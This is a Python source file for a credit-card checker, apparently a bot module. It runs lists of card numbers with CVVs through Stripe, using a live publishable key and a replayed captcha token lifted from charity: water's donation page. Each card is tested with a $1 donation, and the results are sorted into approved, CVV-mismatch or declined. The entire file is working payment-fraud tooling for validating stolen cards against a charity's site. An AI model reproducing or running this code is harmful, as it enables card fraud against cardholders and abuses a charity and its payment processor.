
import aiohttp
import asyncio
import sys
import json
import re
import time

# --- Card Checker Config ---
DOMAIN = "https://www.charitywater.org"
PK = "pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU"

# CCN patterns - only for CVV/CVC related errors
CCN_patterns = [
    'security code is incorrect',
    'incorrect_cvc',
    'cvc_check_failed',
    'Gateway Rejected: cvv',
    'Card Issuer Declined CVV',
]

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None

async def make_request(session, url, method="POST", headers=None, data=None, timeout=30, retries=3):
    """Enhanced request function with retry logic and better error handling"""
    for attempt in range(retries):
        try:
            async with session.request(
                method,
                url,
                headers=headers,
                data=data,
                timeout=aiohttp.ClientTimeout(total=timeout),
                ssl=False  # Bypass SSL issues
            ) as response:
                text = await response.text()
                return response.status, text
        except asyncio.TimeoutError:
            if attempt < retries - 1:
                await asyncio.sleep(2 ** attempt)  # Exponential backoff
                continue
            return 408, "Request timeout"
        except aiohttp.ClientError as e:
            if attempt < retries - 1:
                await asyncio.sleep(1)
                continue
            return 0, f"Client error: {str(e)}"
        except Exception as e:
            if attempt < retries - 1:
                await asyncio.sleep(1)
                continue
            return 0, f"Request failed: {str(e)}"
    
    return 0, "Max retries exceeded"

async def ppc(card):
    try:
        parts = card.split("|")
        if len(parts) != 4:
            return json.dumps({"error": "Invalid card format"})
            
        cc, mon, year, cvv = parts
        year = year[-2:] if len(year) == 4 else year

        # Validate card number
        if not re.match(r'^\d{16}$', cc):
            return json.dumps({"error": "Invalid card number"})
        
        # Create session with better configuration
        connector = aiohttp.TCPConnector(
            limit=10,
            limit_per_host=5,
            ttl_dns_cache=300,
            use_dns_cache=True,
            ssl=False  # Disable SSL verification to avoid cert issues
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            # Step 1: Create payment method with Stripe (with retry logic)
            status1, resp1 = await make_request(
                session,
                url="https://api.stripe.com/v1/payment_methods",
                method="POST",
                headers={
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
                },
                data=f'type=card&billing_details[address][city]=New+york&billing_details[address][country]=IN&billing_details[address][line1]=A27+shsh&billing_details[email]=xavhsu27%40gmail.com&billing_details[name]=John+Smith&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mon}&card[exp_year]={year}&guid=090145d7-183a-44a1-9fac-2c2ee7762a395bb665&muid=3bd1f188-220f-4822-b7fa-2151afa3ab8a89f811&sid=e8a0a1fe-11fb-4bb6-aa5f-e5d954204cdf9621a5&payment_user_agent=stripe.js%2F7eb76afb12%3B+stripe-js-v3%2F7eb76afb12%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=48597&client_attribution_metadata[client_session_id]=669fb863-2872-423d-8cef-00cd7b74b142&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key={PK}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzUyODQxNzY5LCJjZGF0YSI6IlZwbThJV2h6Z0o5RzVKN2w3OWQrWGtqRHJNelJabDByb29uTllxdWVKQXE2b01ZbW5MS0FGT2tSM0NFNFpmSU40UldUNEtjdVIvRVVMcGlKU3poeDBVUGlqcmh2Ums2VTQveTExMVZEMysxYVgzb2tZVTgwN2hYT0ljRVJRTWV6dC9BUXVsMFlVRmdIS2ZNdUlqMjQ4cUw4UC9ibDYxUThUUEEvc2sreHBPVmN2YjVlbkQrODBRVGdISVc3RHA4NHUyMklGN01DYlBPTWxkYngiLCJwYXNza2V5IjoiTGh3Y0dzbnB4V0JqNVkvaStTNGxBZTBrNTUwUHpvaE16Q3h4enNhT25jMHMxOTM5c2Y2cWp1R09XclVUTEhaSktnVVpZRnFvU0dEM1I0dW4zcTNxTHJpMGNDTFZPQ043S0luYm4xWFhRVFBDZGozeGJXU09GRFI0ODA4TnhLbjZpb0V2RWhoZmZNQUw2eGgwcWdmOHlGMFA1NnlNbXZmWlEweHg2aGlCVG5rZmEwR2Y4QVBuN1hxU1A5WDF1UDFEdERHVmhlRkt1ZXBhYzlCVFB1VzR1OXVLNW9ZbEdHYkk4OG8wbldYc1JPOFJwNUtEMzFPdVcxL25vRExQNUNwN3EwUmpHYlV4b1hCQmkzLzFZUHF3cFEwZXB3QjBMM2xpYjdFTUYvSmtrbEVwaGFwbGdUUTVBbkJNenRYYzM1T09lYndmZmtJSUd1RzlJMllIRGhqTi95Qm4yOVZFNlhudERiTlFFN2xJanpjYTlsd285Zkg1U1ExT0t1ekRkU3JVbFdsN2tjR2piYXpZbEEzTi8rdVp0a3FSL2hjWHE1SXdsSG5wRmZxZVMvQ21oamlGWExwQ1preUpuUDlEcXkrNnBYelZCRFJ2eVdVQjQ4V1J5dnlqWnZEQjV5MVhRTExwdS9nN1c4UG1Cekw1dnpsWTk5bEtQRWhESnVhNXZGdi9rN0szTGNrOWg2MU9pd29rY0lCdHY1eTBQZXlubU1WWVRHeVJTeCsvR0ZqME5jSlA2SEpCRXRsSnZDb3J4SHd6TUhPRlIzaUlvYk93d2lXUVY3dDI1RThieDJuYm1WWTdEUDJzZDE1TVViMzdCakozbDgrdmdrZER5azBJOUhMTDRVN0I3dkt3Mk9OTlhJdFlCdm5VUTVyc3NmNUo1M2ROZTJIcjYxNDhNaEpxbmlRcVpnaWFxRGVhYUlkZ2ZmdHc2TzZmUkN0elJyNkZ2TkYxQ2ZIcC80NmhDZXNIU3B3Z0tkRmdHTGZCMXlmaEgzZHV3ZEZXUzRCT05FZTNpS3VyOHd4QXlCQURIa29LTkNrS3NiMldiNWRvbThybEJoZXViQThJTG9WeWpQd2ErV1ViUVZ0aGdsZGN6Q0Y3UGhicGI4TDBaRnlJc1hEanJ3VVV4cDhJY2h2RTVaS2lpeEtsNDlhMHp5QlpoemUwa2dPWGg4a2M3eUdhT1NDbFptOUc5aWJPdXJoUHJ6RmVObjZoSkxPL1NubmZwbS9EYkdxMGZMdXdvL1RPcHRON3ZyZ1BBTU5mQlRoN1FWOEcrT3dSaFNZVXVBMFZZaWxMb2NSeVN0dFpucWFXTFJXbHBnaEhNVmNOcXZzSnhCR2V5K1VKbkZIZVpsZkNyUUZYN3VhK1FiNjVMc0hNenk5Nk5qRzZ4dUhVMnAySXRGeVBQUzFFMCtjSjFLbHducW00bXN2SURnb1YvWU9MY3Y4TlpJcTNiR3ZmQ0k3bCtuaXNyb2dJSHI5VjRodnhPRTlhVTFLenZxcGtOd051OVVOcXlaSkRoUVQ4cDJJRlhEaXFmVUk3ODg5ZU1xV1VIV3UxaUdUYk9ET1ExM0JjWUt6Z0grSjNuM1NJOGNleGI1bUx1bGk2dWNObmZPbEhVQXVXbDZVb0htRXNieExkWHRmQUFBcC9vZ3BWdVVHeGtVL3NpeFFJQjBGejYzeWJQN0ZkdmlXZGc4a3h6akx4ZnhXcEQ5RUk3TnJ5OWVFNXdaVW1UdFZWVFBQTDBsdzlnU2VaclVqS0E4ZXRRdXpJeURyM3IzTHl2b1I3ak5XYU9NVmhkdW15S0I1T1hqbVZCUnljVzNubFA2UVVhb2FDL1F2Rm9IVFoyV2pCbmZvODhmWHQreSsvYUNxRjdhNVY2MExlV3JUWXlzdVBZMmNmSjhmOTRtVlhxLzFMM1N0V0xlRzlTOUhEVURlWldYdzRmVjFYeTRUanBYa0pMUGpLdEE2aFJDOUk2RTJRcHM0bmNiKzcrT0gxVGM1b1JLaXVWYytKaVorYWxNQy8yaVl4K094L2VyeXlPTHpHYzByTzkvYVV4bkRrMWpyU2tyOXBSZVczaWx6YlNEd0dIMHo3WEFQL2lvS3B6MCt1eHZQZ3BHVGFKMm9pTUo4RGhOODhIMWJFUlE1Y25JRnViTWpFaFNhcnZQMjRPbFB6T3BYaFVQeXJqeGNEUnhHZzk4YUhGT0JvTnV4SGU2RUJlVHRTa045Q0syZkUzVzBMSFRVbE0rS0tiZlZsN0g0dCtvdzdmdW0rclE9PSIsImtyIjoiNGE1NjMxNDAiLCJzaGFyZF9pZCI6MjU5MTg5MzU5fQ.nNB7eRxG2k-bemnjEITxt66cXmBbS7wcqCaAjxZbHsk',
                timeout=30,
                retries=3
            )
            
            if status1 not in [200, 201]:
                # Return exact Stripe error response
                return resp1
                
            try:
                payment_data = json.loads(resp1)
                pmid = payment_data.get("id")
            except:
                pmid = parseX(resp1, '"id": "', '"')
                
            if not pmid:
                return json.dumps({"error": {"message": "Payment method creation failed", "code": "pm_creation_failed"}})
            
            # Add delay to prevent rate limiting
            await asyncio.sleep(1)
            
            # Step 2: Process donation
            status2, resp2 = await make_request(
                session,
                url=f"{DOMAIN}/donate/stripe",
                method="POST",
                headers={
                    'accept': '*/*',
                    'accept-language': 'en-GB',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': DOMAIN,
                    'referer': f"{DOMAIN}/",
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
                    'x-csrf-token': 'G6M57A4FuXbsZPZSEK0MAEXhL_9EluoMxuHDF8qR5JDhDtqmBmygTdfZJX5x2RQg-yCWAn2llWRv4oGe8yu04A',
                    'x-requested-with': 'XMLHttpRequest',
                },
                data={
                    'country': 'us',
                    'payment_intent[email]': 'xavh7272u27@gmail.com',
                    'payment_intent[amount]': '1',
                    'payment_intent[currency]': 'usd',
                    'payment_intent[metadata][donation_kind]': 'water',
                    'payment_intent[payment_method]': pmid,
                    'disable_existing_subscription_check': 'false',
                    'donation_form[amount]': '1',
                    'donation_form[comment]': '',
                    'donation_form[display_name]': '',
                    'donation_form[email]': 'xavh7272u27@gmail.com',
                    'donation_form[name]': 'John',
                    'donation_form[payment_gateway_token]': '',
                    'donation_form[payment_monthly_subscription]': 'false',
                    'donation_form[surname]': 'Smith',
                    'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
                    'donation_form[setup_intent_id]': '',
                    'donation_form[subscription_period]': '',
                    'donation_form[metadata][donation_kind]': 'water',
                    'donation_form[metadata][email_consent_granted]': 'true',
                    'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/#give',
                    'donation_form[metadata][phone_number]': '',
                    'donation_form[metadata][plaid_account_id]': '',
                    'donation_form[metadata][plaid_public_token]': '',
                    'donation_form[metadata][uk_eu_ip]': 'false',
                    'donation_form[metadata][url_params][touch_type]': '1',
                    'donation_form[metadata][session_url_params][touch_type]': '1',
                    'donation_form[metadata][with_saved_payment]': 'false',
                    'donation_form[address][address_line_1]': 'A27 shsh',
                    'donation_form[address][address_line_2]': '',
                    'donation_form[address][city]': 'New york',
                    'donation_form[address][country]': 'IN',
                    'donation_form[address][zip]': '10001',
                },
                timeout=45,  # Longer timeout for donation processing
                retries=2
            )
            
            # Return exact donation response
            return resp2
            
    except Exception as e:
        return json.dumps({"error": {"message": f"Processing error: {str(e)}", "code": "processing_error"}})

def parse_result(result):
    try:
        # First try to parse as JSON
        try:
            data = json.loads(result)

            if "error" in data:
                error_msg = data["error"]
                if isinstance(error_msg, dict):
                    message = error_msg.get("message", "Unknown error")
                    code = error_msg.get("code", "unknown")
                else:
                    message = str(error_msg)
                    code = "unknown"

                # Only check for CCN if it's specifically CVV/CVC related
                message_lower = message.lower()
                if any(pattern.lower() in message_lower for pattern in CCN_patterns):
                    return "CCN", message, data
                else:
                    # Return DECLINED with exact message for all other errors
                    return "DECLINED", message, data

            # Check for success indicators
            if data.get("success") or data.get("status") == "succeeded":
                return "APPROVED", "Payment successful", data

            # If no error but also no clear success, return the raw response
            return "DECLINED", str(data), data

        except json.JSONDecodeError:
            # If not JSON, treat as plain text and return as is
            result_lower = result.lower()

            # Only check for CCN if specifically CVV related
            if any(pattern.lower() in result_lower for pattern in CCN_patterns):
                return "CCN", result, result
            # Check for success patterns
            elif any(word in result_lower for word in ["success", "approved", "completed", "thank you"]):
                return "APPROVED", result, result
            else:
                # Return as DECLINED with exact message
                return "DECLINED", result, result

    except Exception as e:
        return "ERROR", f"Parse error: {str(e)}", result


async def stripe_check(card: str):
    """Main entry point to check a card from the bot."""
    try:
        result = await ppc(card)
        status, message, raw = parse_result(result)

        # Log in console
        logger.info("[StripeCheck] Card: %s | Status: %s | Message: %s", card, status, message)
        logger.debug("[StripeCheck] Raw: %s", raw)

        return status, message, raw

    except Exception as e:
        logger.error("Stripe check failed for card %s: %s", card, e, exc_info=True)
        return "ERROR", str(e), None
